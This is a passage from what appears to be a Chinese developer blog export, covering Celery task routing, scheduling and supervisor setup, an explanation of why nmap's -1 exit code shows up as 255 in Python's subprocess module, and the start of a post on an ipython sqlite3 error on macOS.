feeddog任务中调度eat任务去执行，feeddog可以作为中心节点管理，而eat任务可以作为分布式节点去执行。celeryconfig中单独配置了eat任务的存储后端。</p>\n<ul>\n<li>app.py</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> absolute_import</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> celery <span class=\"keyword\">import</span> Celery</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app = Celery(<span class=\"string\">'proj'</span>, include=[<span class=\"string\">'proj.tasks'</span>])</span><br><span class=\"line\">app.config_from_object(<span class=\"string\">'eyes.celeryconfig'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.start()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>tasks.py</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> absolute_import</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> celery <span class=\"keyword\">import</span> group</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> .app <span class=\"keyword\">import</span> app</span><br><span class=\"line\"><span class=\"keyword\">from</span> .scan.scans <span class=\"keyword\">import</span> nmap_scan</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.task</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">eat</span><span class=\"params\">(a, b)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum(a,b)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.task</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">feeddog</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    nums = ((<span class=\"number\">1</span>, <span class=\"number\">3</span>), (<span class=\"number\">2</span>,<span class=\"number\">4</span>), (<span class=\"number\">4</span>, <span class=\"number\">8</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a,b <span class=\"keyword\">in</span> nums:</span><br><span class=\"line\">        eat.delay(a, b)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># or</span></span><br><span class=\"line\"><span class=\"meta\">@app.task</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">feeddog</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    nums = ((<span class=\"number\">1</span>, <span class=\"number\">3</span>), (<span class=\"number\">2</span>,<span class=\"number\">4</span>), (<span class=\"number\">4</span>, <span class=\"number\">8</span>))</span><br><span class=\"line\">    dog_groups = ([eat.s(a, b) <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> nums])</span><br><span class=\"line\">    dog_groups.delay()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>celeryconfig</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">celery config, Ref:</span></span><br><span class=\"line\"><span class=\"string\">http://docs.celeryproject.org/en/master/userguide/configuration.html</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> timedelta</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> kombu <span class=\"keyword\">import</span> Queue</span><br><span class=\"line\"><span class=\"keyword\">from</span> kombu <span class=\"keyword\">import</span> Exchange</span><br><span class=\"line\"><span class=\"keyword\">from</span> celery.backends.mongodb <span class=\"keyword\">import</span> MongoBackend</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> .app <span class=\"keyword\">import</span> app</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># broker</span></span><br><span class=\"line\">broker_url = <span class=\"string\">'pyamqp://guest@localhost:5672//'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># result</span></span><br><span class=\"line\"><span class=\"comment\"># http://docs.celeryproject.org/en/master/_modules/celery/backends/mongodb.html</span></span><br><span class=\"line\">mongodb_url = <span class=\"string\">'mongodb://localhost/celery'</span></span><br><span class=\"line\">result_backend = mongodb_url</span><br><span class=\"line\"><span class=\"comment\"># mongodb_backend_settings = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#     'database': 'proj',                 # databse name</span></span><br><span class=\"line\"><span class=\"comment\">#     'taskmeta_collection': 'celery'     # collection name</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"><span class=\"comment\"># special task backend setting collection</span></span><br><span class=\"line\">eat_backend = MongoBackend(app, url=mongodb_url)</span><br><span class=\"line\">eat_backend.taskmeta_collection = <span class=\"string\">'celery_eat'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># time of keeping result</span></span><br><span class=\"line\">result_expires = <span class=\"number\">60</span> * <span class=\"number\">60</span> * <span class=\"number\">24</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># serializer, compare to json, msgpacker is smaller and better performance</span></span><br><span class=\"line\"><span class=\"comment\"># task_serializer = 'msgpack'</span></span><br><span class=\"line\"><span class=\"comment\"># result_serializer = 'msgpack'</span></span><br><span class=\"line\"><span class=\"comment\"># accept_content = ['msgpack']</span></span><br><span class=\"line\"></span><br><span class=\"line\">timezone = <span class=\"string\">'Asia/Shanghai'</span></span><br><span class=\"line\">enable_utc = <span class=\"keyword\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># task attribute setting</span></span><br><span class=\"line\"><span class=\"comment\"># http://docs.celeryproject.org/en/latest/userguide/tasks.html</span></span><br><span class=\"line\">task_annotations = &#123;</span><br><span class=\"line\">    <span class=\"comment\"># task : args</span></span><br><span class=\"line\">    <span class=\"string\">'proj.tasks.eat'</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">'rate_limit'</span>: <span class=\"string\">'50/s'</span>,</span><br><span class=\"line\">        <span class=\"string\">'backend'</span>: eat_backend</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">'proj.tasks.feeddog'</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">'ignore_result'</span>: <span class=\"keyword\">True</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">task_queues = (</span><br><span class=\"line\">    Queue(<span class=\"string\">'feed'</span>, exchange=Exchange(<span class=\"string\">'feed'</span>),</span><br><span class=\"line\">          routing_key=<span class=\"string\">'feed.#'</span>),</span><br><span class=\"line\">    Queue(<span class=\"string\">'eat'</span>, exchange=Exchange(<span class=\"string\">'eat'</span>),</span><br><span class=\"line\">          routing_key=<span class=\"string\">'eat.#'</span>)</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># routing</span></span><br><span class=\"line\"><span class=\"comment\"># http://docs.celeryproject.org/en/latest/userguide/routing.html</span></span><br><span class=\"line\">task_routes = &#123;</span><br><span class=\"line\">    <span class=\"string\">'proj.tasks.feeddog'</span>: &#123;<span class=\"string\">'queue'</span>: <span class=\"string\">'feed'</span>&#125;,</span><br><span class=\"line\">    <span class=\"string\">'proj.tasks.eat'</span>: &#123;<span class=\"string\">'queue'</span>: <span class=\"string\">'eat'</span>&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># beat schedule</span></span><br><span class=\"line\"><span class=\"comment\"># http://docs.celeryproject.org/en/master/userguide/periodic-tasks.html#beat-entries</span></span><br><span class=\"line\">beat_schedule = &#123;</span><br><span class=\"line\">    <span class=\"string\">'do-nmap-scan-60-seconds'</span>: &#123;          <span class=\"comment\"># scheduler task name</span></span><br><span class=\"line\">        <span class=\"string\">'task'</span>: <span class=\"string\">'proj.tasks.feeddog'</span>,    <span class=\"comment\"># special task name with project name</span></span><br><span class=\"line\">        <span class=\"string\">'schedule'</span>: timedelta(seconds=<span class=\"number\">60</span>),</span><br><span class=\"line\">        <span class=\"comment\">#'args': ()</span></span><br><span class=\"line\">        <span class=\"string\">'options'</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">'queue'</span>: <span class=\"string\">'feed_scan'</span>          <span class=\"comment\"># task to specific queue</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Run:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 分布式端点</span></span><br><span class=\"line\">celery worker -A eyes.app  -l info -Q feed</span><br><span class=\"line\"><span class=\"comment\"># 中心</span></span><br><span class=\"line\">celery worker -A eyes.app -l info -Q eat  </span><br><span class=\"line\"><span class=\"comment\"># 中心</span></span><br><span class=\"line\">celery beat -A eyes.app -l info</span><br></pre></td></tr></table></figure>\n<p>在上面的自动调度方案中，是通过在配置文件中设置调度的相关参数，除了这种方式外还可以在代码里面设置，这种方式控制的粒度更为精细</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># @app.on_after_configure.connect not work</span></span><br><span class=\"line\"><span class=\"meta\">@app.on_after_finalize.connect</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">setup_periodic_tasks</span><span class=\"params\">(sender, **kwargs)</span>:</span></span><br><span class=\"line\">    sender.add_periodic_task(</span><br><span class=\"line\">        <span class=\"number\">60</span>,</span><br><span class=\"line\">        feeddog.s(),</span><br><span class=\"line\">        name=<span class=\"string\">'feed-dog-every-60-seconds'</span></span><br><span class=\"line\">    )</span><br></pre></td></tr></table></figure>\n<h2 id=\"工作流-canvas\"><a href=\"#工作流-canvas\" class=\"headerlink\" title=\"工作流(canvas)\"></a>工作流(canvas)</h2><p>子任务：也可以视为一种任务，但如果把任务视为函数的话，它可能是填了部分参数的函数。子任务的主要价值在于它可以用于关联运算中，即几个子任务按某种工作流方式的定义执行更为复杂的任务。</p>\n<p>Celery工作流包含以下原语：</p>\n<ol>\n<li>group</li>\n</ol>\n<p>group并行的执行一系列任务：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> celery <span class=\"keyword\">import</span> group</span><br><span class=\"line\"><span class=\"keyword\">from</span> proj.tasks <span class=\"keyword\">import</span> add</span><br><span class=\"line\"></span><br><span class=\"line\">group(add.s(i, i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">10</span>))().get()</span><br><span class=\"line\"><span class=\"comment\"># [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]</span></span><br></pre></td></tr></table></figure>\n<ol>\n<li>chain</li>\n</ol>\n<p>chain串行的执行任务：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> celery <span class=\"keyword\">import</span> chain</span><br><span class=\"line\"><span class=\"keyword\">from</span> proj.tasks <span class=\"keyword\">import</span> add, mul</span><br><span class=\"line\"></span><br><span class=\"line\">chain(add.s(<span class=\"number\">4</span>, <span class=\"number\">4</span>) | mul.s(<span class=\"number\">8</span>))().get()</span><br><span class=\"line\"><span class=\"comment\"># (4 + 4) * 8</span></span><br></pre></td></tr></table></figure>\n<ol>\n<li>chord</li>\n</ol>\n<p>chord是包含回调的group操作</p>\n<ol>\n<li>map</li>\n<li>starmap</li>\n<li>chunks</li>\n</ol>\n<h3 id=\"backend-使用rabbitmq\"><a href=\"#backend-使用rabbitmq\" class=\"headerlink\" title=\"backend 使用rabbitmq\"></a>backend 使用rabbitmq</h3><p>Celery 4.0以后backend使用rabbitmq推荐使用rpc， RPC Result Backend有如下特点：</p>\n<ol>\n<li>默认不持久化, 可以通过配置 result_persistent来配置持久化</li>\n<li>优势在于可以实时的获取状态变化，而不用客户端去轮询的获取</li>\n<li>缺点: 只能被检索一次，如果您有两个进程等待相同的结果，其中一个进程将永远不会收到结果</li>\n</ol>\n<h3 id=\"worker-后台运行\"><a href=\"#worker-后台运行\" class=\"headerlink\" title=\"worker 后台运行\"></a>worker 后台运行</h3><p>celery multi命令在后台启动一个或多个worker。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">celery multi start w1 -A proj -l info</span><br><span class=\"line\">celery multi start w1 -A proj -l info --pidfile=/var/run/celery/%n.pid \\</span><br><span class=\"line\">                                      --logfile=/var/log/celery/%n%I.log</span><br><span class=\"line\">celery  multi restart w1 -A proj -l info</span><br><span class=\"line\">celery multi stop w1 -A proj -l info</span><br><span class=\"line\">celery multi stopwait w1 -A proj -l info</span><br></pre></td></tr></table></figure>\n<h2 id=\"supervidor\"><a href=\"#supervidor\" class=\"headerlink\" title=\"supervidor\"></a>supervidor</h2><ul>\n<li>celery.ini</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[group:test_celery]</span><br><span class=\"line\">programs = test_celery.async,test_celery.beat</span><br><span class=\"line\"></span><br><span class=\"line\">[program:test_celery.async]</span><br><span class=\"line\">command=/data/test.celery/env/bin/celery worker -A proj.app --loglevel=info -Q test_celery_queue</span><br><span class=\"line\">numprocs=1</span><br><span class=\"line\">numprocs_start=0</span><br><span class=\"line\">priority=999</span><br><span class=\"line\">autostart=true</span><br><span class=\"line\">startsecs=3</span><br><span class=\"line\">startretries=3</span><br><span class=\"line\">exitcodes=0,2</span><br><span class=\"line\">stopsignal=QUIT</span><br><span class=\"line\">stopwaitsecs=60</span><br><span class=\"line\">directory=/data/test.celery</span><br><span class=\"line\">user=www-data</span><br><span class=\"line\">stopasgroup=false</span><br><span class=\"line\">killasgroup=false</span><br><span class=\"line\">redirect_stderr=true</span><br><span class=\"line\">stdout_logfile=/data/log/test.celery/test_celery.log</span><br><span class=\"line\">stdout_logfile_maxbytes=250MB</span><br><span class=\"line\">stdout_logfile_backups=10</span><br><span class=\"line\">stderr_logfile=/data/log/test.celery/test_celery.err</span><br><span class=\"line\">stderr_logfile_maxbytes=250MB</span><br><span class=\"line\">stderr_logfile_backups=10</span><br><span class=\"line\">environment=PYTHONPATH=&apos;/data/test.celery/&apos;;C_FORCE_ROOT=&quot;true&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[program:test_celery.beat]</span><br><span class=\"line\">command=/data/test.celery/env/bin/celery beat -A proj.app --loglevel=info</span><br><span class=\"line\">numprocs=1</span><br><span class=\"line\">numprocs_start=0</span><br><span class=\"line\">priority=999</span><br><span class=\"line\">autostart=true</span><br><span class=\"line\">startsecs=3</span><br><span class=\"line\">startretries=3</span><br><span class=\"line\">exitcodes=0,2</span><br><span class=\"line\">stopsignal=QUIT</span><br><span class=\"line\">stopwaitsecs=60</span><br><span class=\"line\">directory=/data/test.celery</span><br><span class=\"line\">user=www-data</span><br><span class=\"line\">stopasgroup=false</span><br><span class=\"line\">killasgroup=false</span><br><span class=\"line\">redirect_stderr=true</span><br><span class=\"line\">stdout_logfile=/data/log/test.celery/test_celery.beat.log</span><br><span class=\"line\">stdout_logfile_maxbytes=250MB</span><br><span class=\"line\">stdout_logfile_backups=10</span><br><span class=\"line\">stderr_logfile=/data/log/test.celery/test_celery.beat.err</span><br><span class=\"line\">stderr_logfile_maxbytes=250MB</span><br><span class=\"line\">stderr_logfile_backups=10</span><br><span class=\"line\">environment=PYTHONPATH=&apos;/data/test.celery/&apos;;C_FORCE_ROOT=&quot;true&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"简单说明\"><a href=\"#简单说明\" class=\"headerlink\" title=\"简单说明\"></a>简单说明</h4><ul>\n<li><strong>test_celery.async</strong> 和 <strong>test_celery.beat</strong> 是两个program，分别对应worker和beat，而它们又同属于 <strong>test_celery</strong> 这个组，这样便于同时管理。</li>\n<li><strong>environment</strong> 下设置 PYTHONPATH </li>\n</ul>\n<h2 id=\"Ref\"><a href=\"#Ref\" class=\"headerlink\" title=\"Ref\"></a>Ref</h2><ol>\n<li><a href=\"http://blog.csdn.net/libing_thinking/article/details/78566208\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/libing_thinking/article/details/78566208</a></li>\n</ol>\n","categories":["note"],"tags":["celery"]},{"title":"【develop】nmap exit code 255","url":"http://www.beesfun.com/2017/11/30/【develop】nmap-exit-code-255/","content":"<p>使用python subprocess模块调用namp程序竟然返回255错误代码，如下所示:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In [<span class=\"number\">4</span>]: subprocess.check_output([<span class=\"string\">'nmap'</span>])</span><br><span class=\"line\">---------------------------------------------------------------------------</span><br><span class=\"line\">CalledProcessError                        Traceback (most recent call last)</span><br><span class=\"line\">&lt;ipython-input<span class=\"number\">-4</span><span class=\"number\">-3</span>ea255c65d35&gt; <span class=\"keyword\">in</span> &lt;module&gt;()</span><br><span class=\"line\">----&gt; 1 subprocess.check_output(['nmap'])</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/local/Cellar/python/<span class=\"number\">2.7</span><span class=\"number\">.14</span>/Frameworks/Python.framework/Versions/<span class=\"number\">2.7</span>/lib/python2<span class=\"number\">.7</span>/subprocess.pyc <span class=\"keyword\">in</span> check_output(*popenargs, **kwargs)</span><br><span class=\"line\">    <span class=\"number\">217</span>         <span class=\"keyword\">if</span> cmd <span class=\"keyword\">is</span> <span class=\"keyword\">None</span>:</span><br><span class=\"line\">    <span class=\"number\">218</span>             cmd = popenargs[<span class=\"number\">0</span>]</span><br><span class=\"line\">--&gt; 219         raise CalledProcessError(retcode, cmd, output=output)</span><br><span class=\"line\">    <span class=\"number\">220</span>     <span class=\"keyword\">return</span> output</span><br><span class=\"line\">    <span class=\"number\">221</span></span><br><span class=\"line\"></span><br><span class=\"line\">CalledProcessError: Command <span class=\"string\">'['</span>nmap<span class=\"string\">']'</span> returned non-zero exit status <span class=\"number\">255</span></span><br></pre></td></tr></table></figure>\n<p>查看nmap在线文档<a href=\"https://nmap.org/book/ncat-man-exit-code.html\" target=\"_blank\" rel=\"noopener\">https://nmap.org/book/ncat-man-exit-code.html</a>，返回码只有0, 1, 2三种，并没有提及255这个返回码，而且一般程序设计不会返回255这样的数字。于是只好查看nmap源码了。在nmap源码文件<code>nmap.cc</code>的<code>nmap_main</code>函数里面有大量返回码，包括: -1, 0, 1, 2。而不是只有文档中所描述的三种返回码。当nmap不带任何参数调用时，返回-1，也就是python显示的返回码255。-1和255有没有想到些什么，-1的补码就是255，难道程序的返回码做了类型转换，带着这个疑问，实验验证如下：<br><a id=\"more\"></a></p>\n<h3 id=\"实验验证\"><a href=\"#实验验证\" class=\"headerlink\" title=\"实验验证\"></a>实验验证</h3><p>编写c程序如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"return -1\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译运行如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">▶ ./test</span><br><span class=\"line\">return -1%</span><br></pre></td></tr></table></figure>\n<p>pyhon调用验证，显示返回状态为255，也就是-1的unsigned形式, 而不是直接显示-1的返回码。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In [<span class=\"number\">2</span>]: subprocess.check_output(<span class=\"string\">'./test'</span>)</span><br><span class=\"line\">---------------------------------------------------------------------------</span><br><span class=\"line\">CalledProcessError                        Traceback (most recent call last)</span><br><span class=\"line\">&lt;ipython-input<span class=\"number\">-2</span><span class=\"number\">-20</span>f1d6c2bb80&gt; <span class=\"keyword\">in</span> &lt;module&gt;()</span><br><span class=\"line\">----&gt; 1 subprocess.check_output('./test')</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/local/Cellar/python/<span class=\"number\">2.7</span><span class=\"number\">.14</span>/Frameworks/Python.framework/Versions/<span class=\"number\">2.7</span>/lib/python2<span class=\"number\">.7</span>/subprocess.pyc <span class=\"keyword\">in</span> check_output(*popenargs, **kwargs)</span><br><span class=\"line\">    <span class=\"number\">217</span>         <span class=\"keyword\">if</span> cmd <span class=\"keyword\">is</span> <span class=\"keyword\">None</span>:</span><br><span class=\"line\">    <span class=\"number\">218</span>             cmd = popenargs[<span class=\"number\">0</span>]</span><br><span class=\"line\">--&gt; 219         raise CalledProcessError(retcode, cmd, output=output)</span><br><span class=\"line\">    <span class=\"number\">220</span>     <span class=\"keyword\">return</span> output</span><br><span class=\"line\">    <span class=\"number\">221</span></span><br><span class=\"line\"></span><br><span class=\"line\">CalledProcessError: Command <span class=\"string\">'./test'</span> returned non-zero exit status <span class=\"number\">255</span></span><br></pre></td></tr></table></figure>\n<p>那么，python为什么不直接输出程序的返回码，而转成了正整数呢？参考：<a href=\"https://docs.python.org/2/library/subprocess.html#subprocess.Popen.returncode\" target=\"_blank\" rel=\"noopener\">https://docs.python.org/2/library/subprocess.html#subprocess.Popen.returncode</a></p>\n<p>返回码为负数是有特殊含义的，-N表明子程序是被信号N所终止的。</p>\n","categories":["develop"],"tags":["nmap","subprocess"]},{"title":"【Mac】解决ipython使用sqlite3报错问题","url":"http://www.beesfun.com/2017/11/30/【Mac】解决ipython使用sqlite3报错问题/","content":"<p>在pycharm上调试程序使用其自带python控制台，查看变量属性或做些简单的计算，出现报错如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">self.ipython.history_manager.save_thread.pydev_do_not_trace = True #don&apos;t trace ipython history saving thread</span><br></pre></td></tr></table></figure>\n<p>python是brew安装的python 2.7.14版本，并安装了ipython==5.4.10, 